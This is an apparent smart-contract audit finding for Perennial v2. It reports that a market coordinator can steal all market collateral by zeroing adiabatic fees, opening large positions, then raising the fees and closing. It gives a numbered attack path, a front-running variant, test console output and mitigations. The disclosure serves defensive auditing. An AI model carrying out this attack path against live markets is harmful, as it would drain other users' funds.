# Market coordinator can steal all market collateral by changing adiabatic fees

**Summary**
The README states the following:
> Q: Please list any known issues and explicitly state the acceptable risks for each known issue.
> Coordinators are given broad control over the parameters of the markets they coordinate. The protocol parameter is designed to prevent situations where parameters are set to malicious steal funds. If the coordinator can operate within the bounds of reasonable protocol parameters to negatively affect markets we would like to know about it

Even when protocol parameters are reasonable, market coordinator can steal all market funds by utilizing the adiabatic fees change. The adiabatic fees are fees taken from takers when they increase skew (difference between open longs and shorts) and paid to takers when they decrease skew to incentivize orders which reduce price risk for makers. The issue is that market coordinator can set adiabatic fees to 0, open large maker/taker positions (taker position paying 0 adiabatic fees), then immediately set adiabatic fees to max possible (e.g. 1%) and close taker/maker positions (receiving the adiabatic fee). This fees difference when adiabatic fees are changed by market coordinator is subtracted from market's global `exposure`, which is supposed to be paid/received by the owner. I.e. when adiabatic fees are increased, this increases exposure to be paid by the owner with coordinator being able to withdraw this amount to himself (up to total market's collateral available), meaning coordinator can steal all market funds.

**Root Cause**
The root cause is the protocol design of adiabatic fees, it's hard to pinpoint any specific code which is the root cause.

When market risk parameters are updated, `Global.update` is called with new risk parameters, which changes the global `exposure`:
https://github.com/sherlock-audit/2024-08-perennial-v2-update-3/blob/main/perennial-v2/packages/perennial/contracts/types/Global.sol#L54-L56

This global `exposure` has to be covered or received by owner by calling `claimExposure`:
https://github.com/sherlock-audit/2024-08-perennial-v2-update-3/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L329-L339

Since market coordinator can change adiabatic fees, this allows market coordinator to control the owner's exposure, which is essentially what lets coordinator to take advantage of this and steal funds.

**Internal pre-conditions**
Coordinator is malicious
OR
User front-runs adiabatic fees increase transaction

**External pre-conditions**
None.

**Attack Path**
1. Coordinator sets adiabatic fees and all the other fees to 0, also increases makerLimit to large amount to cause larger impact
2. Coordinator opens large maker position and large taker position (paying 0 fees)
3. Wait for 1 oracle version to settle maker and taker positions
4. Coordinator sets adiabatic fees to max allowed value (e.g. 1%)
5. Coordinator closes taker position, settles it, closes maker position, settles it
6. At this point maker should have about the same amount of collateral as deposited, and taker should have deposited collateral + adiabatic fees paid to taker for closing the position. Both maker and taker accounts withdraw all collateral. Most likely total collateral will be higher than the market has, so simply withdraw all collateral market has

At this point all funds are stolen by coordinator (and if not - simply repeat from step 1 until all funds are stolen). The other users will have positive collateral balances, but they will be unable to withdraw anything since market token balance will be 0 (market owner will have large negative exposure).

Alternative attack scenario:
1. Coordinator wants to increase adiabatic fees
2. User listens to coordinator transaction and front-runs it by creating huge taker position (possibly 2 taker positions - long+short to be delta-neutral, also maybe maker position if necessary, to be able to open large taker positions). This doesn't need to be classic front-run, maybe the coordinator will announce risk parameter changes in the forum or somewhere, and user opens these positions in anticipation of adiabatic fees increase
3. Coordinator transaction to increase adiabatic fees goes through
4. User closes his positions, receiving large profit from adiabatic fees only (which should more than cover all the other fees, and market price risk can be neutralized by opening delta-neutral positions), at the expense of the owner's exposure

**Impact**
All market collateral token balance is stolen.

Console output:
```solidity
UserB collateral with open taker: 10000000000000
User collateral after closing: 10000060000000
UserB collateral after closing: 11229933600000
UserC collateral after closing: 1000000000000
Exposure to be paid by owner: -1230000000000
```

Notice, that all 3 users deposited a total of 21M, but after the attack collateral of coordinator's users (user and userB) is 21.2M and userC collateral is still 1M, but the total of all 3 users is 22.2M, 1.2M is the exposure which should be covered by the owner.

**Mitigation**
This is the design issue, so mitigation only depends on the intended design. Possible options:
1. Remove adiabatic fees altogether
2. Limit the total exposure amount which can be created by the coordinator (not full fix, but at least limits the loss)
3. Force coordinator to pay exposure instead of owner (this is just partial fix though, and if exposure which can be received is also due to coordinator, this opens reverse attack vector of draining funds from existing users by decreasing adiabatic fees)
